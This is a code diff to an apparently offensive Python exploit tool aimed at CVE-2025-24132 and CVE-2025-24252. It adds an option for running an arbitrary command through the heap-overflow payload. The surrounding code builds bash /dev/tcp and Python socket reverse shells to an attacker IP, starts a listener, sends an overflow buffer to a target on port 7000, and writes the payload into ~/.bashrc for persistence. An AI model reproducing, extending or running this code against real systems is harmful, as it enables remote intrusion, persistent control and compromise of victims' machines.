@@ -24,9 +24,11 @@ def print_banner():
     """)
 
 # --- Payload Generators ---
-def generate_payload(attacker_ip, port, method):
+def generate_payload(attacker_ip, port, method, command):
     if method == "bash":
         shell = f"bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1"
+    elif method == "bash_own_command":
+        shell = command
     elif method == "python":
         shell = (
             f"python3 -c 'import socket,os,pty;s=socket.socket();"
@@ -54,7 +56,7 @@ def generate_payload(attacker_ip, port, method):
 # --- Persistence (Linux .bashrc) ---
 def add_persistence(attacker_ip, port, method):
     print("[*] Adding persistence to ~/.bashrc...")
-    payload = generate_payload(attacker_ip, port, method).decode()
+    payload = generate_payload(attacker_ip, port, method, "").decode()
     try:
         with open(os.path.expanduser("~/.bashrc"), "a") as f:
             f.write(f"\n# EVA PERSISTENCE\n{payload}\n")
@@ -87,14 +89,14 @@ def exploit_24252(interface):
     print("[+] mDNS crash packet sent on interface:", interface)
 
 # --- CVE-2025-24132 (Heap Overflow + Reverse Shell) ---
-def exploit_24132(target_ip, attacker_ip, port, method, persistent):
+def exploit_24132(target_ip, attacker_ip, port, method, persistent, command):
     print(f"[*] Launching CVE-2025-24132 (Heap Overflow + RCE)...")
     start_listener(port)
 
     try:
         sock = socket.create_connection((target_ip, 7000), timeout=5)
         overflow = b"A" * 1024
-        payload = generate_payload(attacker_ip, port, method)
+        payload = generate_payload(attacker_ip, port, method, command)
         full_payload = overflow + b"\n" + payload + b"\n"
         sock.sendall(full_payload)
         sock.close()
@@ -115,8 +117,9 @@ def main():
     parser.add_argument("--target", help="Target IP (for CVE-24132)")
     parser.add_argument("--attacker", help="Your IP for reverse shell")
     parser.add_argument("--port", default="4444", help="Port for reverse shell")
-    parser.add_argument("--payload", default="bash", choices=["bash", "python", "powershell"], help="Payload type")
+    parser.add_argument("--payload", default="bash", choices=["bash", "bash_own_command", "python", "powershell"], help="Payload type")
     parser.add_argument("--persistent", action="store_true", help="Enable real persistence (Linux only)")
+    parser.add_argument("--command", help="Custom command for bash payload (if using bash_own_command)")
 
     args = parser.parse_args()
 
@@ -130,7 +133,7 @@ def main():
         if not args.target or not args.attacker:
             print("[-] Target and attacker IP required.")
             return
-        exploit_24132(args.target, args.attacker, int(args.port), args.payload, args.persistent)
+        exploit_24132(args.target, args.attacker, int(args.port), args.payload, args.persistent, args.command)
 
 if __name__ == "__main__":
     try:
